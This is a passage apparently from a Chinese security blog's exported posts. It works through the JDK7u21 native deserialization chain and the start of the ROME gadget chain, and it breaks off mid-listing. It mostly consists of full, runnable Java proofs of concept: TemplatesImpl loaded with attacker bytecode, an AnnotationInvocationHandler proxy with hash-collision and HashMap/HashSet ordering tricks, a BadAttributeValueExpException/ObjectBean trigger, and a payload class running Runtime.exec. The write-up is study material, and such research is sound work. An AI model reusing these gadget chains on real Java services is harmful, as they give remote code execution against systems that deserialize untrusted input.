hash值相同的问题。\n结合前面的分析及CC链的学习，我们这里需要put进两个值，并且第二个值为一个代理对象。\n现在来看一下hash值的计算问题。回到hash计算部分代码：\n思考一下，第一个值就是直接调用它的hashCode()方法，第二个put进的值需要为代理对象。先跟第二个键值对的计算方法： 由于我们传入的k是AnnotationInvocationHandle代理对象，所以这里调用hashCode()方法就会到AnnotationInvocationHandler类的invoke()方法，就会调用到hashCodeImpl()方法：\n跟进这个hashCodeImpl()方法： 这个方法声明了一个Map.Entry类型的var3，然后创建了一个迭代器var2，用于遍历this.memberrValues变量的条目集，所以这里的membeValues应该为一个Map对象，我们可以用一个HashMap实例来代表。\n如果 membeValues 只有一个键值对，该hash就等于127 * key.hashCode() ^ value.hashCode()，而当key.hashCode为0，任何数异或0的结果仍是他本身： 在ysoserial项目提供了一个字符串f5a5a608，其hashCode值正好为0。所以该hash计算可以简化成value.hashCode，\n重点来了，前面我们说过了put进的第一个值需要为TemplatesImpl类的实例，所以前面在计算hash值调用的hash()方法中，计算方式就是templatesImpl.hashCode()。\n而只要我们将value设置为TemplatesImpl对象，就能实现Proxy.hashCode等于TemplatesImpl.hashCode，也就是第二个的计算方式也是templatesImpl.hashCode()。\n这样就能成功通过hash值相同的问题。\n——————————\n问题解决，尝试构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(ctf,111); hash.put(proxy,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 弹出一个计算机。看了一下，确实是序列化之前造成的，HashMap的put()会调用，老生常谈了： 解决方法就是将最开始加入templatesImpl类实例的地方不要加入，让hash值直接不相同：\n改成下面的POC试试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); //这个不能删，再调用一次修改值即可 hashMap.put(\u0026#34;f5a5a608\u0026#34;,\u0026#34;fupanc\u0026#34;); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(ctf,111); hash.put(proxy,111); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 还是不行，看了一下其他师傅的文章，说是在最后的HashMap中放入ctf和proxy时调换一下位置即可，即如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(proxy,111); hash.put(ctf,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 运行调试后发现确实是反序列化时弹出来的计算机，并且在序列化之前也没有弹出计算机。\n————\n后面想了一下，这样不就与之前分析的不一样了吗。百思不得其解。\n然后就一直调试，最后在发现，实在反序列化时出现了问题。\nHashMap反序列化时的问题：\n从代码中可以知道，这里是一个放入键值对的地方，但是我想当然地想着这里会按照顺序来放入键值对，调试如下（以上面正确的代码为例）：\n先放入的键值对如下：\n然后继续再一次断于这个点，放入的键值对如下：\n也就是proxy中存在的hashMap。\n然后继续再一次断于这个点，键值对如下：\n可以看到最后才是这个proxy，而我们的放入的操作为： 是先放入的proxy再放入的ctf，但是这里的反序列化时的顺序是不一样的，我们想利用的代码如下：\n所以是需要key为proxy代理对象的，但是序列化和反序列化的顺序是不同的，所以这里需要先放入proxy，后放入ctf，这样，也就不会导致序列化之前的弹计算机了。\n如果按照之前的顺序，那么确实是会在序列化之前弹出计算机，符合弹计算机的条件。\n但是在反序列化时，HashMap的顺序就是 hashMap里的键值对 ==》hash中的proxy 键值对 ==\u0026gt;hash中的ctf(TemplatesImpl键值对)。并且调试后也符合情况。\n然后我在JDK8也试了一下，也是先反序列化的第二个键值对，但是测试的键值对都是以一个类实例为key，问了一下，原因大概如下：\n这个是因为HashMap序列化和反序列化时本身其顺序就可能不同，其顺序时基于哈希值来决定的，所以这里可能就与环境有关了。也许在某个环境我最开始的那个先放入fupanc再修改为ctf的方法也是有用的呢（反正刚学的时候应该是可以的，这里再重看的时候不行了）。反正多试。\n为了验证想法，使用如下POC来验证：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.util.HashMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ // TemplatesImpl ctf = new TemplatesImpl(); // // HashMap hashMap = new HashMap(); HashMap hash = new HashMap(); hash.put(\u0026#34;fupanc1\u0026#34;,111); hash.put(\u0026#34;fupanc2\u0026#34;,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 这样在反序列化时就是先放入的第一个，再放入的第二个。\n——————\n基于现在的情况，那么现在序列化前的流程肯定也要变，简单跟一下： 还是直接断于hash中第二次放入键值对的代码，如下：\n可以知道这里的hash值时肯定相同的，具体流程和之前分析的不一样，但是此时的调用equals()方法就有区别了，这里的TemplatesImpl类没有定义equals()方法，这里会直接调用到Object.java类的equals()方法：\n从变量的值来看，这里是会返回false的，然后直接就会成功放入第二个键值对。\n所以最终的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(proxy,111); hash.put(ctf,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } HashSet HashSet本来就和HashMap差不多，并且反序列化时也是先反序列化的第二个键值对。readObject内容为：\n可以看到其实就是调用的HashMap的put()方法，这个也是前面分析过了的，最终POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashSet hash = new HashSet(); hash.add(proxy); hash.add(ctf); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功在反序列化时弹计算机。\n其实在可以利用equals()方法的地方，只要JDK版本符合 \u0026lt;= 7u21 ，都要想到这个原生链，比如ROME链的第三条就有用到equals()方法，大同小异。\n","date":"2025-01-22T14:14:01+08:00","permalink":"https://fupanc-w1n.github.io/p/jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/","title":"JDK7u21原生链"},{"content":"Rome链 RMOE 是一个用于RSS 和 Atom 订阅的Java框架。它是开源的。\n它是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或Java对象。\n环境准备 环境依赖：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;rome\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试环境：\nJDK 8u411 rome 1.0 需要了解的类 ToStringBean 这个类位于com.sun.syndication.feed.impl.ToStringBean，这个类主要就是看他的toString方法。\n他有两个toStirng()方法，前一个是无参的public类型的方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public String toString() { Stack stack = (Stack)PREFIX_TL.get(); String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek()); String prefix; if (tsInfo == null) { String className = this._obj.getClass().getName(); prefix = className.substring(className.lastIndexOf(\u0026#34;.\u0026#34;) + 1); } else { prefix = tsInfo[0]; tsInfo[1] = prefix; } return this.toString(prefix); } 后面一个就是有参的private类型的方法，源代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } } catch (Exception var8) { sb.append(\u0026#34;\\n\\nEXCEPTION: Could not complete \u0026#34; + this._obj.getClass() + \u0026#34;.toString(): \u0026#34; + var8.getMessage() + \u0026#34;\\n\u0026#34;); } return sb.toString(); } 先简单了解一下，后面再细说。\nObjectBean 这个类位于com.sun.syndication.feed.impl.ObjectBean，它是Rome 提供的一个封装类型，初始化时提供了一个 Class 类型和一个Object 对象实例进行封装： 现在着重于看这个类中的方法，这里有三个方法可以利用，下面分别说明一下：\ntoString() ObjectBean类的toString()方法源代码如下：\n所以这里会调用ToStringBean类的toString()方法，前面说过ToStringBean来有两个toString()方法，这里是没有传入参数的，所以调用的是ToStringBean的第一个toString()方法。\n并且可以看出最后调用的是第二个toString并传入了prefix，这里简单分析一下途中我画红线两段代码，其实就是获取我传入的类实例的名字。看下面代码就能看懂：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package org.example; public class Haha { public static void main(String[] args) throws Exception { String prefix; Haha _obj =new Haha(); String className = _obj.getClass().getName(); System.out.println(className); prefix = className.substring(className.lastIndexOf(\u0026#34;.\u0026#34;) + 1); System.out.println(prefix); } } 结果为：\n1 2 org.example.Haha Haha 基本就知道了，就是用来获取类名的。\n——————\n现在我们再来看第二个toString()方法，重点分析其中的一部分代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } } 1.先看BeanIntrospector.getPropertyDescriptors(this._beanClass)，我们点开源代码看一下：\n这里用到了_introspected变量，我们可以看一下这个变量的赋值： 可以看到这里就直接将这个变量赋值为了HashMap类的实例。继续看getPropertyDescriptors方法，逐行来看：\n1 PropertyDescriptor[] descriptors = (PropertyDescriptor[])((PropertyDescriptor[])_introspected.get(klass)); 所以这里会调用HashMap的get方法，来获取kclass对应的值。\n再来看一下我们在实例化ObjectBean时调用的ToStringBean类的构造方法： 所以这里的kclass对应的_beanClass的类型是一个Class类对象。\n——————\n继续getPropertyDescriptors方法，很明显我们并没有往BeanIntrospector的HashMap中放入任何值，所以这里的get()返回的肯定是null。\n所以顺理成章进入到if语句，如下代码：\n1 2 3 4 if (descriptors == null) { descriptors = getPDs(klass); _introspected.put(klass, descriptors); } 这里会先调用getPDs()方法，然后再将这个kclass和getPDs的结果put进HasMap里形成一个键值对。\n现在再来看这里调用的getPDs()： 这个方法大概就是获取这个Class对象所有的getter和setter然后打包成数组返回。\n所以这个方法最终会将这个Class对象和它的setterr和getter打包成键值对放入BeanIntrospector类的HashMap中。\n最后会将这个数组返回：\n所以这里的getPropertyDescriptors()方法就是获取我们传入的Class对象的getter和setter方法，逻辑还是挺好看懂的，如果HashMap中有相对应的键值对就直接以数组形式返回setter和getter方法，没有的话就重新找然后返回。\n————————\n2.继续看toString()方法，现在得到了结果，假设我们传入的Class有getter和setter，那么getPropertyDescriptors()方法返回的就不为null，即pds不为null，成功进入if条件：\n1 2 3 4 5 6 7 8 9 10 if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } 现在就是重点分析if语句内的java语句了。\n对于这个for循环，只要能进入if语句就能进行至少一次for循环（因为数组中只要有一个值那么length就为1），继续看后面的代码： 然后这里的 getReadMethod() 方法是获取Class对象的getter方法，如果正确获取到了get方法，应该就可以通过里面的if条件，然后就可以调用到invoke方法，这里的NO_PARAMS变量的值也是固定的，如下： 这里可以把new Object[0]理解成类似于null这种，然后就可以正常调用getter方法获取值。\n现在就出来了一条链，类似CB链这种，现在就可以利用到TemplateImpl类的getOutputProperties()方法： 这样就可以直接构造攻击了。现在就可以先去看攻击构造的toString部分了.\nhashCode() 再粘过来一下ObjectBean的构造方法：\n这里ObjectBean类的hashCode()方法源码如下：\n然后从上面的初始化方法可以看出这里会调用 _equalsBean 变量对应的EqualsBean类实例的beanHashCode() 方法，源码如下： 这里就又是一个触发toString()方法的地方，并且这个EqualsBean类的_obj变量是可控的： 前面的判断语句就是看我传入的参数obj是否是beanClass类的实例，是的话就返回true，反之依然，由于!，所以这里我们传入的obj需要是beanClass的实例。只要我们将这里的Obj又控制为一个恶意ObjectBean类实例即可。\n现在就又可以构造一个利用链了。这里是用的HashMap来构造。现在就可以直接去看攻击构造的hashCode()那一步了。\nequals() 同样的再次把ObjectBean构造方法粘过来一下： 现在来看这个类的equals()方法： 所以这里会调用EqualsBean类的beanEquals()方法，方法重点源码如下：\n这里的代码和前面的toString()方法大相径庭，还是获取一个类的getter和setter方法，然后调用invoke()方法。\n现在的想法就是对前面的if条件的判断，如下： 前面很好进，主要就是我重点标注的地方。这里就是要求我们传入的obj是 _beanClass 的实例。这个简单，传一个impl进去就行。\n先来看我们如何调用这个equals()方法。正好我们的CC7中就有利用到equals()方法。这里就是用Hashtable类。\n后续就可以直接去看攻击构造了。\n攻击构造 toString() 前面说的已经非常清楚了。还是挺简单的。\n那么还是利用动态加载字节码。基本盘： Test.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就是接入链子。\n主要就是想在哪里可以调用ObjectBean的toString()方法。而在CC5中用到的BadAttributeValueExpException类反序时就可以调用到toStirng方法（这个类位于javax.management.BadAttributeValueExpException）：\n在CC5我们就说了这里的valObj其实对应的就是序列化的变量val，所以我们控制这个变量为ObjectBean()即可，使用反射来更改val的值即可，那么构造的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(TemplatesImpl.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 弹不了，然后我去看了一下其他师傅的文章，发现这里不能用TemplatesImpl.class，而是Templates.class，关系如下： 在Templates.class中有个接口，里面就有我们要利用的getOutputProperties：\n所以我们就可以使用Templates.class来获取到这个getter方法。\n那么为什么我们要使用这个呢？明明逻辑上没有问题，TemplatesImpl.class就是有问题呢？\n先给POC，然后我们再调试看看。\n所以最终POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(Templates.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); 